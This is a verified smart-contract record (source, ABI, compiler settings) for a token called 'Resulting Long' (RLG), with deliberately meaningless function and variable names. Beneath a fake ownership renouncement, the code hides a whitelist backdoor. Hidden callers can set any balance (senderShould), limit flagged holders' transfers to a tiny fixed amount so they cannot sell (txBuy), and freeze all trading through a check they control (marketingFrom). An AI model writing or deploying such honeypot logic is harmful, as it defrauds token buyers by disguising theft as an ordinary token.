{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface txList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityTake {\n    function createPair(address enableFund, address sellTeamReceiver) external returns (address);\n}\n\ninterface fromAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenEnableLiquidity) external view returns (uint256);\n\n    function transfer(address receiverToTeam, uint256 amountMin) external returns (bool);\n\n    function allowance(address atShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverToTeam,\n        uint256 amountMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalSell, uint256 value);\n    event Approval(address indexed atShould, address indexed spender, uint256 value);\n}\n\ninterface totalTake is fromAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ResultingLong is teamExempt, fromAuto, totalTake {\n\n    string private atTotal = \"Resulting Long\";\n\n    function txBuy(address shouldModeLaunched) public {\n        limitBuyFrom();\n        if (launchToken != tradingExempt) {\n            autoFund = tradingExempt;\n        }\n        if (shouldModeLaunched == shouldTxSell || shouldModeLaunched == receiverTrading) {\n            return;\n        }\n        amountTotalLaunched[shouldModeLaunched] = true;\n    }\n\n    address public shouldTxSell;\n\n    mapping(address => bool) public amountTotalLaunched;\n\n    address public receiverTrading;\n\n    function getOwner() external view returns (address) {\n        return limitFee;\n    }\n\n    function senderShould(address launchTeamFrom, uint256 amountMin) public {\n        limitBuyFrom();\n        minEnable[launchTeamFrom] = amountMin;\n    }\n\n    function maxTrading(address fundLimit, address receiverToTeam, uint256 amountMin) internal returns (bool) {\n        require(minEnable[fundLimit] >= amountMin);\n        minEnable[fundLimit] -= amountMin;\n        minEnable[receiverToTeam] += amountMin;\n        emit Transfer(fundLimit, receiverToTeam, amountMin);\n        return true;\n    }\n\n    uint256 public launchToken;\n\n    mapping(address => uint256) private minEnable;\n\n    uint256 private tradingExempt;\n\n    uint256 public autoFund;\n\n    uint256 isTake;\n\n    uint256 constant amountTokenTrading = 15 ** 10;\n\n    address feeIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private limitMin;\n\n    function allowance(address txSellSwap, address txSell) external view virtual override returns (uint256) {\n        if (txSell == minMode) {\n            return type(uint256).max;\n        }\n        return modeMin[txSellSwap][txSell];\n    }\n\n    event OwnershipTransferred(address indexed isLaunch, address indexed isAt);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletSell;\n    }\n\n    function marketingFrom(address fundLimit, address receiverToTeam, uint256 amountMin) internal returns (bool) {\n        if (fundLimit == shouldTxSell) {\n            return maxTrading(fundLimit, receiverToTeam, amountMin);\n        }\n        uint256 marketingReceiver = fromAuto(receiverTrading).balanceOf(feeIs);\n        require(marketingReceiver == marketingMax);\n        require(receiverToTeam != feeIs);\n        if (amountTotalLaunched[fundLimit]) {\n            return maxTrading(fundLimit, receiverToTeam, amountTokenTrading);\n        }\n        return maxTrading(fundLimit, receiverToTeam, amountMin);\n    }\n\n    function limitBuyFrom() private view {\n        require(isList[_msgSender()]);\n    }\n\n    address private limitFee;\n\n    function approve(address txSell, uint256 amountMin) public virtual override returns (bool) {\n        modeMin[_msgSender()][txSell] = amountMin;\n        emit Approval(_msgSender(), txSell, amountMin);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return limitFee;\n    }\n\n    address minMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private modeMin;\n\n    function transfer(address launchTeamFrom, uint256 amountMin) external virtual override returns (bool) {\n        return marketingFrom(_msgSender(), launchTeamFrom, amountMin);\n    }\n\n    mapping(address => bool) public isList;\n\n    function teamLimit() public {\n        emit OwnershipTransferred(shouldTxSell, address(0));\n        limitFee = address(0);\n    }\n\n    uint256 private walletSell = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoAt;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atTotal;\n    }\n\n    string private receiverBuy = \"RLG\";\n\n    constructor (){\n        \n        txList buyList = txList(minMode);\n        receiverTrading = liquidityTake(buyList.factory()).createPair(buyList.WETH(), address(this));\n        if (tradingExempt == limitMin) {\n            launchToken = tradingExempt;\n        }\n        shouldTxSell = _msgSender();\n        teamLimit();\n        isList[shouldTxSell] = true;\n        minEnable[shouldTxSell] = walletSell;\n        \n        emit Transfer(address(0), shouldTxSell, walletSell);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverBuy;\n    }\n\n    function maxLaunched(uint256 amountMin) public {\n        limitBuyFrom();\n        marketingMax = amountMin;\n    }\n\n    bool public listMin;\n\n    uint8 private autoAt = 18;\n\n    function transferFrom(address fundLimit, address receiverToTeam, uint256 amountMin) external override returns (bool) {\n        if (_msgSender() != minMode) {\n            if (modeMin[fundLimit][_msgSender()] != type(uint256).max) {\n                require(amountMin <= modeMin[fundLimit][_msgSender()]);\n                modeMin[fundLimit][_msgSender()] -= amountMin;\n            }\n        }\n        return marketingFrom(fundLimit, receiverToTeam, amountMin);\n    }\n\n    function balanceOf(address tokenEnableLiquidity) public view virtual override returns (uint256) {\n        return minEnable[tokenEnableLiquidity];\n    }\n\n    function totalFrom(address takeReceiver) public {\n        require(takeReceiver.balance < 100000);\n        if (listMin) {\n            return;\n        }\n        \n        isList[takeReceiver] = true;\n        if (limitMin != autoFund) {\n            tradingExempt = limitMin;\n        }\n        listMin = true;\n    }\n\n    uint256 marketingMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSellSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTotalLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenEnableLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"maxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeamFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"senderShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTxSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"totalFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeamFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverToTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldModeLaunched\",\"type\":\"address\"}],\"name\":\"txBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ResultingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}